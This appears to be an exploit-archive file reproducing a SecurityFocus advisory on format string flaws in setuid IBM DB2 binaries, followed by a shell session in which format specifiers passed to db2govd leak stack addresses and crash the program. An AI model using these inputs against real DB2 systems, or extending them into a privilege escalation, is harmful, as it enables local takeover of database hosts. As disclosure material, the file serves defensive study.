@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/8989/info
+  
+Multiple command-line parameter format string vulnerabilities have been discovered in various IBM DB2 binaries. Specifically, format-based functions are implemented erroneously within the db2govd, db2start, and db2stop programs. These binaries are typically installed setuid. As a result, a malicious local user may be capable of gaining elevate privileges.
+
+[db2inst1@RiotStarter adm]$ ./db2govd validate garbage %x
+GOV1023N Unable to open configuration file "bfffed88". RC = "-2045837302".
+[db2inst1@RiotStarter adm]$ ./db2govd validate garbage %n%n%n
+Segmentation fault
+[db2inst1@RiotStarter adm]$ ./db2govd stop a %x
+db2govd: GOV1005N No governor for database "A" on node "bfffe188" is
+running, or it is already being stopped.
+[db2inst1@RiotStarter adm]$ ./db2govd stop a %n%n%n
+Segmentation fault
+[db2inst1@RiotStarter adm]$ ./db2govd stop %x b
+db2govd: GOV1005N No governor for database "BFFFD788" on node "b" is
+running, or it is already being stopped.
+[db2inst1@RiotStarter adm]$ ./db2govd stop %n%n%n b
+Segmentation fault 
